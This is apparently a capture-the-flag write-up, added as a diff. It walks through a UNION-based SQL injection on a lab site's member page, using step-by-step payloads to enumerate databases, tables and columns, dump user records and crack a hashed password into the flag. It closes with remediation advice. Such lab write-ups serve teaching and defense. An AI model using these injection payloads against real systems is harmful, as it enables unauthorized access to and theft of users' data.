@@ -1,0 +1,105 @@
+
+
+recource about UNION :
+
+Concatenates the results of two queries into a single result set. You control whether the result set includes duplicate rows:
+
+UNION ALL - Includes duplicates.
+UNION - Excludes duplicates.
+
+
+ex: https://sql.sh/cours/union
+----------------------------------------------------------------------------------------------------
+
+On the page http://<IP>/index.php?page=member
+
+To get the request columns number: if the number of select params is more or less then 2 the query break
+    1 UNION SELECT NULL, NULL--
+    ==> 2 cols
+
+Retrieve database names:
+    1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata--
+
+    ========================================
+    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
+    Title: information_schema
+    Url : 
+    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
+    Title: Member_Brute_Force
+    Url : 
+    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
+    Title: Member_Sql_Injection
+    Url : 
+    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
+    Title: Member_guestbook
+    Url : 
+    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
+    Title: Member_images
+    Url : 
+    ID: 1 UNION ALL SELECT NULL,schema_name FROM information_schema.schemata-- 
+    Title: Member_survey
+    Url : 
+    ========================================
+
+==> Member_Sql_Injection
+
+Retrieve table names:
+    Member_Sql_Injection to HEX  ==> 0x4d656d6265725f53716c5f496e6a656374696f6e
+    1 UNION SELECT NULL, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e-- 
+==> users
+
+Get the users columns names
+    users to HEX ==> 0x7573657273
+    1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e  AND TABLE_NAME = 0x7573657273--   => user_id
+    ========================================
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : user_id
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : first_name
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : last_name
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : town
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : country
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : planet
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : Commentaire
+        ID:     1 UNION ALL SELECT NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e AND TABLE_NAME = 0x7573657273-- 
+        First name: 
+        Surname : countersign
+    ========================================
+
+
+See all users's data:  
+        1 UNION SELECT user_id, CONCAT( first_name, CHAR(10), last_name, CHAR(10), town, CHAR(10), country, CHAR(10), planet ,CHAR(10), Commentaire ,CHAR(10), countersign) FROM users--
+
+        ========================================
+       ID: 1 UNION SELECT user_id, CONCAT( first_name, CHAR(10), last_name, CHAR(10), town, CHAR(10), country, CHAR(10), planet ,CHAR(10), Commentaire ,CHAR(10), countersign) FROM users-- 
+        First name: 5
+        Surname : Flag
+        GetThe
+        42
+        42
+        42
+        Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+        5ff9d0165b4f92b14994e5c685cdce28
+        ========================================
+
+        Decrypt the hash with md5 we get ===> 'FortyTwo'
+        we crypt it with Sha256 we get the flag ==> '10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5'
+
+solution:
+    - use of prepared statements (with parameterized queries)
+        https://techcommunity.microsoft.com/t5/sql-server-blog/how-and-why-to-use-parameterized-queries/ba-p/383483#:~:text=A%20parameterized%20query%20is%20a,to%20avoid%20SQL%20injection%20attacks
+    - make sure the user input is just a number
+
+    
